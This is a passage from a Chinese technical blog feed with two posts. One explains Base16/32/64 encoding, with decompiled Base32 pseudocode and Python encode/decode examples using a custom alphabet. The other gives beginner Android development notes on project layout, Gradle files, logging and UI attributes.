<p>Base32字符表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</code><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/201912182031120.png" alt="在这里插入图片描述"></p>
<h3 id="Base32编码方式">Base32编码方式<a class="header-anchor" href="#Base32编码方式"> ¶ </a></h3>
<ol>
<li>将数据(根据ASCII编码,UTF-8编码等)转成对应的二进制数</li>
<li>然后将所有的二进制全部串起来，5个二进制位为一组，若不足5位则低位补0，转化成对应十进制数。</li>
<li>若不足40位，则补<code>=</code><br>
一个<code>=</code>相当于5位，补满40位为止。</li>
</ol>
<p>例：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191218210335864.png" alt="在这里插入图片描述"><br>
最后01不足5位，低位补全0。补为<code>01000</code>，也就是8<br>
然后这才35位，需要末尾补一个<code>=</code><br>
所以<code>LOVE</code>用Base32编码后得到<code>JRHVMRI=</code></p>
<p>base32 结尾可能会有 <code>=</code> 号，但最多有 6 个</p>
<h3 id="Base32伪代码-实际环境">Base32伪代码|实际环境<a class="header-anchor" href="#Base32伪代码-实际环境"> ¶ </a></h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v30 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(v6 + v2) )               <span class="comment">// v2为字符串首地址，v6为0开始遍历</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v6;</span><br><span class="line">      v5 += <span class="number">8</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v30 );                         <span class="comment">// 循环完，v5为将所有字符转换为二进制位、的位数</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    v28 = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> ( v5 % <span class="number">40</span> )                            <span class="comment">// 这里对位数是否能整除40做判断，来判断是否添加&#x27;=&#x27;</span></span><br><span class="line">                                                <span class="comment">// v4等于多少就添加几个&#x27;=&#x27;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">      v4 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">16u</span>:</span><br><span class="line">      v4 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24u</span>:</span><br><span class="line">      v4 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32u</span>:</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">      v25 = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v29 = (<span class="number">8</span> * v3 + <span class="number">4</span>) / <span class="number">5</span>;                       <span class="comment">// 除以5，算一下转换后数据个数</span></span><br><span class="line">                                                <span class="comment">// +4的原因是，向上取整，让余数也算一个数据</span></span><br></pre></td></tr></table></figure>
<h2 id="Base64编码">Base64编码<a class="header-anchor" href="#Base64编码"> ¶ </a></h2>
<h3 id="Base64编码表格">Base64编码表格<a class="header-anchor" href="#Base64编码表格"> ¶ </a></h3>
<p>使用了ASCII编码中64个可打印的字符(大写字母A ~ Z,小写字母a ~ z,数字0~9以及&quot;+“,”/&quot;)<br>
Base64字符表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191218210834868.png" alt="在这里插入图片描述"></p>
<h3 id="Base64编码方式">Base64编码方式<a class="header-anchor" href="#Base64编码方式"> ¶ </a></h3>
<ol>
<li>
<p>将数据(根据ASCII编码,UTF-8编码等)转成对应的二进制数</p>
</li>
<li>
<p>然后将所有的二进制全部串起来，6个二进制位为一组，若不足6位则低位补0，转化成对应十进制数。</p>
</li>
<li>
<p>若不足24位，则补<code>=</code><br>
一个<code>=</code>相当于6个二进制位。<br>
例：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191218212504346.png" alt="在这里插入图片描述"><br>
最后只有4位，低位补全0，则为<code>111100</code><br>
然后3*6=18 不足24位，加上一个<code>=</code><br>
<code>LO</code>加密后是<code>TE8=</code></p>
</li>
</ol>
<p>base64 结尾可能会有 <code>=</code> 号，但最多有 2 个</p>
<h3 id="Base64伪代码-实际环境">Base64伪代码|实际环境<a class="header-anchor" href="#Base64伪代码-实际环境"> ¶ </a></h3>
<p>当函数头是这种时候，大概率是Base64加密，然后根据字符集来确认<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2019121821311285.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191225172334626.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20200111213239645.png" alt="在这里插入图片描述"></p>
<h3 id="Base64url-编码">Base64url 编码<a class="header-anchor" href="#Base64url-编码"> ¶ </a></h3>
<p>字符表中的  <code>+</code>→  <code>-</code>，  <code>/</code>→  <code>_</code></p>
<h2 id="总结-2">总结<a class="header-anchor" href="#总结-2"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">下标数字的位个数</th>
<th style="text-align:center">编码表字符串</th>
<th style="text-align:center">位数不足是否会补全=</th>
<th style="text-align:center">编码后数据量变化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">base16</td>
<td style="text-align:center">4</td>
<td style="text-align:center">数字0~ 9和字母A~F</td>
<td style="text-align:center">不会，位数刚好是4的倍数</td>
<td style="text-align:center">由一个8位表示一个字符 变成  4位表示一个字符，数据量变为原来的2倍</td>
</tr>
<tr>
<td style="text-align:center">base32</td>
<td style="text-align:center">5</td>
<td style="text-align:center">大写字母A~ Z 和 数字2~7</td>
<td style="text-align:center">会</td>
<td style="text-align:center">变为 8/5 倍</td>
</tr>
<tr>
<td style="text-align:center">base64</td>
<td style="text-align:center">6</td>
<td style="text-align:center">大写字母A~ Z，小写字母a~ z，数字0~9以及&quot;+“，”/&quot;</td>
<td style="text-align:center">会</td>
<td style="text-align:center">变为 8/6=4/3 倍</td>
</tr>
</tbody>
</table>
<h1 id="Base加解密-Python实现">Base加解密|Python实现<a class="header-anchor" href="#Base加解密-Python实现"> ¶ </a></h1>
<h2 id="Base16加解密实现">Base16加解密实现<a class="header-anchor" href="#Base16加解密实现"> ¶ </a></h2>
<h3 id="Base16加解密（原始字符表）">Base16加解密（原始字符表）<a class="header-anchor" href="#Base16加解密（原始字符表）"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">original = <span class="string">&#x27;wo tai nan le&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1  original:  &quot;</span>,<span class="built_in">type</span>(original),original)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2  original.encode(&#x27;utf-8&#x27;):  &quot;</span>,<span class="built_in">type</span>(original.encode(<span class="string">&#x27;utf-8&#x27;</span>)),original.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">str_encode = base64.b16encode(original.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;3  str_encode:  &quot;</span>,<span class="built_in">type</span>(str_encode),str_encode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;4  str(str_encode,&#x27;utf-8&#x27;):  &quot;</span>,<span class="built_in">type</span>(<span class="built_in">str</span>(str_encode,<span class="string">&#x27;utf-8&#x27;</span>)),<span class="built_in">str</span>(str_encode,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">str_decode = base64.b16decode(str_encode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5  str_decode:  &quot;</span>,<span class="built_in">type</span>(str_decode),str_decode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(str_decode,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>输出结果为<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191219170829198.png" alt="在这里插入图片描述"><br>
关键代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base64.b16encode(&lt;<span class="string">&#x27;bytes&#x27;</span>&gt;)  <span class="comment">#base16编码</span></span><br><span class="line">base64.b16decode(&lt;<span class="string">&#x27;bytes&#x27;</span>&gt;)  <span class="comment">#base16解码</span></span><br></pre></td></tr></table></figure>
<p>可以知道，在python3.7中<br>
base64.b<em>16</em>encode(X)  其中需要加密的类型为’<em>bytes</em>’<br>
（其中<em>16</em>可自行替换为16 32 64）<br>
同时，加密后的类型也为’<em>bytes</em>’类型</p>
<p>所以加密的时候需要<strong>将 <em>str</em> 类型先转换为 <em>bytes</em> 类型：</strong><br>
例如：origin是一个 <em>str</em> 类型，则<code>origin.encode('utf-8')</code>则为 <em>bytes</em> 类型</p>
<p>而<strong>将 <em>bytes</em> 类型先转换为 <em>str</em> 类型：</strong><br>
代码：<code>str(origin,'utf-8')</code>其中origin是需要转换的 <em>bytes</em> 类型数据</p>
<h3 id="Base16加解密（自定义字符表）">Base16加解密（自定义字符表）<a class="header-anchor" href="#Base16加解密（自定义字符表）"> ¶ </a></h3>
<p>Base16的原始字符表为：<code>0123456789ABCDEF</code><br>
倘若我们替换成<code>abcdef0123456789</code><br>
用到两个方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>.maketrans(intab, outtab)  //用于创建字符映射的转换表</span><br><span class="line">intab -- 字符串中被替代的字符组成的字符串。</span><br><span class="line">outtab -- 用来替换的字符串。</span><br><span class="line">后者替换前者</span><br><span class="line"><span class="comment">#第三个参数此处不讨论</span></span><br><span class="line">此处的<span class="built_in">str</span>不可改</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>.translate(table[, deletechars])  //根据参数table给出的表转换字符串的字符</span><br><span class="line">table -- 翻译表，翻译表是通过maketrans方法转换而来。</span><br><span class="line">deletechars -- 字符串中要过滤的字符列表。<span class="comment">#第二个参数此处不讨论</span></span><br><span class="line">此处的<span class="built_in">str</span>为需要转换的字符串，自行根据自己字符串取的名称进行更换</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">intab = <span class="string">&quot;like&quot;</span></span><br><span class="line">outtab = <span class="string">&quot;love&quot;</span></span><br><span class="line">biao = <span class="built_in">str</span>.maketrans(intab, outtab)</span><br><span class="line">origin = <span class="string">&quot;I like you&quot;</span></span><br><span class="line"><span class="built_in">print</span>(origin.translate(biao))</span><br></pre></td></tr></table></figure>
<p>输出<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191219173824799.png" alt="在这里插入图片描述"><br>
<strong>加解密实例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">origin = <span class="string">&#x27;wo tai nan le!!&#x27;</span></span><br><span class="line">biao1 = <span class="built_in">str</span>.maketrans(<span class="string">&quot;0123456789ABCDEF&quot;</span>,<span class="string">&quot;abcdef0123456789&quot;</span>)</span><br><span class="line">str_encode = base64.b16encode(origin.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">encode = <span class="built_in">str</span>(str_encode,<span class="string">&#x27;utf-8&#x27;</span>).translate(biao1)</span><br><span class="line"><span class="built_in">print</span>(encode)</span><br><span class="line">biao2 = <span class="built_in">str</span>.maketrans(<span class="string">&quot;abcdef0123456789&quot;</span>,<span class="string">&quot;0123456789ABCDEF&quot;</span>)</span><br><span class="line">str_decode = base64.b16decode(encode.translate(biao2).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(str_decode,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1109ca1e0b03ca080b08ca060fcbcb</span><br><span class="line">wo tai nan le!!</span><br></pre></td></tr></table></figure>
<h2 id="Base32加解密实现">Base32加解密实现<a class="header-anchor" href="#Base32加解密实现"> ¶ </a></h2>
<p>同Base16加解密，将b16改为b32即可</p>
<h2 id="Base64加解密实现">Base64加解密实现<a class="header-anchor" href="#Base64加解密实现"> ¶ </a></h2>
<p>同Base16加解密，将b16改为b64即可</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Android个人学习笔记</title>
    <url>/Development/android/Android_Development_Notes/</url>
    <content><![CDATA[<h1 id="Android">Android<a class="header-anchor" href="#Android"> ¶ </a></h1>
<p>[TOC]</p>
<h2 id="Android基础、项目目录结构">Android基础、项目目录结构<a class="header-anchor" href="#Android基础、项目目录结构"> ¶ </a></h2>
<h3 id="项目结构">项目结构<a class="header-anchor" href="#项目结构"> ¶ </a></h3>
<h4 id="Project">Project<a class="header-anchor" href="#Project"> ¶ </a></h4>
<ol>
<li>
<p>.gradle和.idea：这两个目录下放置的都是Android Studio自动生成的一些文件，我们无须关心，也不要去手动编辑。</p>
</li>
<li>
<p>app：项目中的代码、资源等内容几乎都是放置在这个目录下的，开发工作也基本都是在这个目录下进行的。</p>
</li>
<li>
<p>build：这个目录你也不需要过多关心，它主要包含了一些在编译时自动生成的文件。</p>
</li>
<li>
<p>gradle：这个目录下包含了gradle wrapper的配置文件，使用gradle wrapper的方式不需要提前将gradle下载好，而是会自动根据本地的缓存情况决定是否需要联网下载gradle。Android Studio默认没有启用gradlewrapper的方式，如果需要打开，可以点击Android Studio导航栏→File→Settings→Build, Execution,Deployment→Gradle，进行配置更改。</p>
</li>
<li>
<p>.gitignore：这个文件是用来将指定的目录或文件排除在版本控制之外的</p>
</li>
<li>
<p>build.gradle：这是项目全局的gradle构建脚本，通常这个文件中的内容是不需要修改的。</p>
</li>
<li>
<p>gradle.properties：这个文件是全局的gradle配置文件，在这里配置的属性将会影响到项目中所有的gradle编译脚本。</p>
</li>
<li>
<p>gradlew和gradlew.bat：这两个文件是用来在命令行界面中执行gradle命令的，其中gradlew是在Linux或Mac系统中使用的，gradlew.bat是在Windows系统中使用的。</p>
</li>
<li>
<p>HelloWorld.iml：<br>
iml文件是所有IntelliJ IDEA项目都会自动生成的一个文件（Android Studio是基于IntelliJ IDEA开发的），用于标识这是一个IntelliJ IDEA项目，我们不需要修改这个文件中的任何内容。</p>
</li>
<li>
<p>local.properties：这个文件用于指定本机中的Android SDK路径，通常内容都是自动生成的，我们并不需要修改。除非你本机中的Android SDK位置发生了变化，那么就将这个文件中的路径改成新的位置即可。</p>
</li>
<li>
<p>settings.gradle：<br>
这个文件用于指定项目中所有引入的模块。由于HelloWorld项目中就只有一个app模块，因此该文件中也就只引入了app这一个模块。通常情况下模块的引入都是自动完成的，需要我们手动去修改这个文件的场景可能比较少。</p>
</li>
</ol>
<h4 id="app目录">app目录<a class="header-anchor" href="#app目录"> ¶ </a></h4>
<ol>
<li>
<p>build：这个目录和外层的build目录类似，主要也是包含了一些在编译时自动生成的文件，不过它里面的内容会更多更杂，我们不需要过多关心。</p>
</li>
<li>
<p>libs：如果你的项目中使用到了第三方jar包，就需要把这些jar包都放在libs目录下，放在这个目录下的jar包都会被自动添加到构建路径里去。</p>
</li>
<li>
<p>androidTest：此处是用来编写Android Test测试用例的，可以对项目进行一些自动化测试。</p>
</li>
<li>
<p>java：毫无疑问，java目录是放置我们所有Java代码的地方，展开该目录，你将看到我们刚才创建的HelloWorldActivity文件就在里面。</p>
</li>
<li>
<p>res：这个目录下的内容就有点多了。简单点说，就是你在项目中使用到的所有图片、布局、字符串等资源都要存放在这个目录下。当然这个目录下还有很多子目录，图片放在<br>
drawable目录下，布局放在layout目录下，字符串放在values目录下，所以你不用担心<br>
会把整个res目录弄得乱糟糟的。</p>
</li>
<li>
<p>AndroidManifest.xml：这是你整个Android项目的配置文件，你在程序中定义的所有四大组件都需要在这个文件里注册，另外还可以在这个文件中给应用程序添加权限声明。</p>
</li>
<li>
<p>test：此处是用来编写Unit Test测试用例的，是对项目进行自动化测试的另一种方式。</p>
</li>
<li>
<p>.gitignore：这个文件用于将app模块内的指定的目录或文件排除在版本控制之外，作用和外层的.gitignore文件类似。</p>
</li>
<li>
<p>app.iml：IntelliJ IDEA项目自动生成的文件，我们不需要关心或修改这个文件中的内容。</p>
</li>
<li>
<p>build.gradle：这是app模块的gradle构建脚本，这个文件中会指定很多项目构建相关的配置。</p>
</li>
<li>
<p><a href="http://proguard-rules.pro">proguard-rules.pro</a>：这个文件用于指定项目代码的混淆规则，当代码开发完成后打成安装包文件，如果不希望代码被别人破解，通常会将代码进行混淆，从而让破解者难以阅读。</p>
</li>
</ol>
<h4 id="build-gradle文件">build.gradle文件<a class="header-anchor" href="#build-gradle文件"> ¶ </a></h4>
<p>HelloWorld项目中有两个build.gradle文件，一个是在最外层目录下的，一个是在app目录下的。</p>
<h6 id="最外层目录build-gradle">最外层目录build.gradle<a class="header-anchor" href="#最外层目录build-gradle"> ¶ </a></h6>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath <span class="string">&#x27;com.android.tools.build:gradle:2.2.0&#x27;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两处<code>repositories</code> 的闭包中都声明了<code>jcenter()</code></p>
<p>jcenter是一个代码托管仓库，很多Android开源项目都会选择将代码托管到jcenter上，声明了这行配置之后，我们就可以在项目中轻松引用任何jcenter上的开源项目。</p>
<p>dependencies 闭包中使用classpath声明了一个Gradle插件来构建Android项目，声明<br>
<code>com.android.tools.build:gradle:2.2.0</code> 这个插件。其中，最后面的部分是插件的版本号，为2.2.0</p>
<h6 id="app内部build-gradle">app内部build.gradle<a class="header-anchor" href="#app内部build-gradle"> ¶ </a></h6>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;com.android.application&#x27;</span>     <span class="comment">// 应用插件</span></span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">24</span>        <span class="comment">// 指定项目的编译版本</span></span><br><span class="line">    buildToolsVersion <span class="string">&quot;24.0.2&quot;</span>  <span class="comment">// 指定项目构建工具的版本</span></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.helloworld&quot;</span>  <span class="comment">// 指定项目的包名</span></span><br><span class="line">        minSdkVersion <span class="number">15</span>        <span class="comment">// 指定项目最低兼容的Android系统版本</span></span><br><span class="line">        targetSdkVersion <span class="number">24</span>     <span class="comment">// 指定的值表示你在该目标版本上已经做过了充分的测试，会启用该版本的新特性(目标版本)</span></span><br><span class="line">        versionCode <span class="number">1</span>           <span class="comment">// 指定项目的版本号</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span>       <span class="comment">// 指定项目的版本名</span></span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="literal">false</span> <span class="comment">// 指定是否对项目的代码进行混淆，true 表示混淆，false 表示不混淆</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br><span class="line">            <span class="comment">// proguardFiles 用于指定混淆时使用的规则文件，这里指定了两个文件</span></span><br><span class="line">            <span class="comment">// 第一个proguard-android.txt 是在Android SDK目录下的，里面是所有项目通用的混淆规则；</span></span><br><span class="line">            <span class="comment">// 第二个proguard-rules.pro 是在当前项目的根目录下的，里面可以编写当前项目特有的混淆规则</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;	<span class="comment">// 指定当前项目所有的依赖关系</span></span><br><span class="line">    compile fileTree(<span class="attr">dir:</span> <span class="string">&#x27;libs&#x27;</span>, <span class="attr">include:</span> [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    compile <span class="string">&#x27;com.android.support:appcompat-v7:24.2.1&#x27;</span></span><br><span class="line"></span><br><span class="line">    testCompile <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>第一行<code>apply plugin</code>应用了一个插件，一般有两种值可选：<code>com.android.application </code>表示这是一个应用程序模块，<code>com.android.library</code> 表示这是一个库模块。应用程序模块和库模块的最大区别在于，一个是可以直接运行的，一个只能作为代码库依附于别的应用程序模块来运行</p>
</li>
<li>
<p><code>dependencies</code>依赖：</p>
<ul>
<li>
<p>通常Android Studio项目一共有3种依<br>
赖方式：本地依赖、库依赖和远程依赖。</p>
<ul>
<li>本地依赖可以对本地的Jar包或目录添加依赖关系</li>
<li>库依赖可以对项目中的库模块添加依赖关系</li>
<li>远程依赖则可以对jcenter库上的开源项目添加依赖关系。</li>
</ul>
</li>
<li>
<p>观察一下<code>dependencies</code>闭包中的配置，第一行的<code>compile fileTree</code> 就是一个本地依赖声明，它表示将<code>libs</code>目录下所有.jar后缀的文件都添加到项目的构建路径当中。</p>
</li>
<li>
<p>而第二行的compile则是远程依赖声明，<code>com.android.support:appcompat-v7:24.2.1</code>就是一个标准的远程依赖库格式，其中<code>com.android.support</code> 是域名部分，用于和其他公司的库做区分；<code>appcompat-v7</code> 是组名称，用于和同一个公司中不同的库做区分；<code>24.2.1</code>是版本号，用于和同一个库不同的版本做区分。</p>
<p>加上这句声明后，Gradle在构建项目时会首先检查一下本地是否已经有这个库的缓存，如果没有的话则会去自动联网下载，然后再添加到项目的构建路径当中。</p>
</li>
<li>
<p>库依赖声明这里没有用到，它的基本格式是<code>compile project 后面加上要依赖的库名称</code>，比如说有一个库模块的名字叫helper，那么添加这个库的依赖关系只需要加入<code>compile project(':helper')</code> 这句声明即可。</p>
</li>
<li>
<p>另外剩下的一句testCompile 是用于声明测试用例库的，这个我们暂时用不到，先忽略它就可以了</p>
</li>
</ul>
</li>
</ul>
<h4 id="res资源目录">res资源目录<a class="header-anchor" href="#res资源目录"> ¶ </a></h4>
<ul>
<li>所有以drawable开头的文件夹都是用来放图片的</li>
<li>所有以mipmap开头的文件夹都是用来放应用图标的</li>
<li>所有以values开头的文件夹都是用来放字符串、样式、颜色等配置的</li>
<li>layout文件夹是用来放布局文件的</li>
</ul>
<p>mipmap开头的文件夹，其实主要是为了让程序能够更好地兼容各种设备。drawable文件夹也是相同的道理，虽然Android Studio没有帮我们自动生成，但是我们应该自己创建drawable-hdpi、drawable-xhdpi、drawable-xxhdpi等文件夹</p>
<h5 id="string-xml字符串资源">string.xml字符串资源<a class="header-anchor" href="#string-xml字符串资源"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当需要引用时</p>
<ul>
<li>在代码中通过<code>R.string.app_name</code> 可以获得该字符串的引用。</li>
<li>在XML中通过<code>@string/app_name</code> 可以获得该字符串的引用。</li>
</ul>
<h3 id="日志工具使用">日志工具使用<a class="header-anchor" href="#日志工具使用"> ¶ </a></h3>
<h4 id="使用Android的日志工具Log">使用Android的日志工具Log<a class="header-anchor" href="#使用Android的日志工具Log"> ¶ </a></h4>
<p>Android中的日志工具类是Log（android.util.Log），这个类中提供了如下5个方法来供我们打印日志。</p>
<ul>
<li><code>Log.v()</code> 。用于打印那些最为琐碎的、意义最小的日志信息。对应级别<code>verbose</code>，是Android日志里面级别最低的一种。</li>
<li><code>Log.d()</code> 。用于打印一些调试信息，这些信息对你调试程序和分析问题应该是有帮助的。对应级别<code>debug</code>，比verbose高一级。</li>
<li><code>Log.i()</code> 。用于打印一些比较重要的数据，这些数据应该是你非常想看到的、可以帮你分析用户行为数据。对应级别<code>info</code>，比debug高一级。</li>
<li><code>Log.w()</code> 。用于打印一些警告信息，提示程序在这个地方可能会有潜在的风险，最好去修复一下这些出现警告的地方。对应级别<code>warn</code>，比info高一级。</li>
<li><code>Log.e()</code> 。用于打印程序中的错误信息，比如程序进入到了catch语句当中。当有错误信息打印出来的时候，一般都代表你的程序出现严重问题了，必须尽快修复。对应级别<code>error</code>，比warn高一级</li>
</ul>
<h2 id="Android-UI控件">Android UI控件<a class="header-anchor" href="#Android-UI控件"> ¶ </a></h2>
<table>
<thead>
<tr>
<th>控件</th>
<th style="text-align:center">属性</th>
<th style="text-align:center">作用</th>
<th style="text-align:center">值</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td style="text-align:center"><code>android:layout_width</code></td>
<td style="text-align:center">设置宽</td>
<td style="text-align:center">match_parent <br>fill_parent <br>wrap_content</td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:layout_height</code></td>
<td style="text-align:center">设置高</td>
<td style="text-align:center">xx dp</td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:gravity</code></td>
<td style="text-align:center">内容对齐方式</td>
<td style="text-align:center">top 、bottom 、left 、right、center</td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:text</code></td>
<td style="text-align:center">文字内容</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:textSize</code></td>
<td style="text-align:center">文字大小</td>
<td style="text-align:center">xx sp</td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:textColor</code></td>
<td style="text-align:center">文字颜色</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:textAllCaps</code></td>
<td style="text-align:center">文字全部大写</td>
<td style="text-align:center"><code>true</code>/<code>false</code></td>
</tr>
<tr>
<td>EditText</td>
<td style="text-align:center"><code>android:maxLines</code></td>
<td style="text-align:center">指定最大行数</td>
<td style="text-align:center">[number]</td>
</tr>
<tr>
<td>ImageView</td>
<td style="text-align:center"><code>android:src</code></td>
<td style="text-align:center">设置图片路径</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"><code>android:visibility</code></td>
<td style="text-align:center">设置控件可见属性</td>
<td style="text-align:center">visible 、invisible 和gone</td>
</tr>
<tr>
<td>ProgressBar</td>
<td style="text-align:center"><code>style=&quot;?android:attr/progressBarStyleHorizontal&quot;</code></td>
<td style="text-align:center">水平进度条</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td>ProgressBar</td>
<td style="text-align:center"><code>android:max</code></td>
<td style="text-align:center">进度条最大值</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
